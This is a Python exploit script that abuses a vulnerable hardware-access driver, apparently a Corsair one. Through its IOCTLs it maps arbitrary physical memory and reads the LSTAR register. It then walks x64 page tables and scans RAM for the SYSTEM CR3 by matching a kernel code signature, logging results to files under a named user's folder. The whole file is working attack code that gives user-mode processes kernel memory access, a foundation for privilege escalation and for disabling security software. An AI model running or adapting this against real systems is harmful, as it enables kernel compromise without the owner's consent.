
import ctypes
import struct
import winreg
import sys
import os
import time

IOCTL_MAP_PHYS_MEM = 0x00225374
IOCTL_READ_MSR = 0x00225388
IA32_LSTAR = 0xC0000082
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

_MAP_CACHE = {}

def log(msg):
    try:
        with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt", "a") as f:
            f.write(f"{msg}\n")
    except:
        pass

def map_page(h, pa):
    pa &= ~0xFFF
    if pa in _MAP_CACHE: return _MAP_CACHE[pa]
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    _MAP_CACHE[pa] = out.value
    return out.value

def read8(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    try:
        return struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(v + (pa & 0xFFF))))[0]
    except:
        return None

def kva_to_pa(h, kva, cr3):
    idxs = [(kva >> 39) & 0x1FF, (kva >> 30) & 0x1FF, (kva >> 21) & 0x1FF, (kva >> 12) & 0x1FF]
    e = read8(h, (cr3 & PTE_PHYS_MASK) + idxs[0] * 8)
    if e is None or not (e & 1): return None
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[1] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[2] * 8)
    if e is None or not (e & 1): return None
    if e & 0x80: return (e & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)
    e = read8(h, (e & PTE_PHYS_MASK) + idxs[3] * 8)
    if e is None or not (e & 1): return None
    return (e & PTE_PHYS_MASK) + (kva & 0xFFF)

def get_lstar(h):
    inn = ctypes.c_uint64(IA32_LSTAR)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    kernel32.DeviceIoControl(h, IOCTL_READ_MSR, ctypes.byref(inn), 8, ctypes.byref(out), 8, ctypes.byref(ret), None)
    return out.value

def main():
    try:
        if os.path.exists(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt"):
            os.remove(r"C:\Users\justin hernando\Documents\VulnDriver\tools\brute_log.txt")
        log("Started main")
        
        h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
        if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
            log(f"Driver Error {ctypes.get_last_error()}")
            return
        
        lstar = get_lstar(h)
        log(f"LSTAR: 0x{lstar:X}")
        
        sys.path.append(r"C:\Users\justin hernando\Documents\VulnDriver")
        from driver_interact import get_ntoskrnl_base, load_lstar_signature
        ntos = get_ntoskrnl_base()
        sig = load_lstar_signature(ntos, lstar, 16)
        if not sig:
            log("No sig")
            return
        log(f"Sig: {sig.hex()}")

        ram_ranges = [(4096, 651264), (1048576, 3722059776), (3724238848, 11759616), (3739217920, 3268608), (3742511104, 307200)]
        for start, length in ram_ranges:
            log(f"Range 0x{start:X}-0x{start+length:X}")
            for pa in range(start, start + length, 0x1000):
                pml4e = read8(h, pa + 496 * 8)
                if pml4e is None or not (pml4e & 1): continue
                res_pa = kva_to_pa(h, lstar, pa)
                if res_pa:
                    v = map_page(h, res_pa & ~0xFFF)
                    if v:
                        data = bytes((ctypes.c_ubyte * 16).from_address(v + (res_pa & 0xFFF)))
                        if data == sig:
                            log(f"FOUND 0x{pa:X}")
                            with open(r"C:\Users\justin hernando\Documents\VulnDriver\tools\system_cr3.txt", "w") as f:
                                f.write(f"0x{pa:X}\n")
                            return
                if pa % 0x1000000 == 0:
                    pass # Keep it fast
        log("Done - not found")
    except Exception as e:
        log(f"Ex: {e}")

if __name__ == "__main__":
    main()
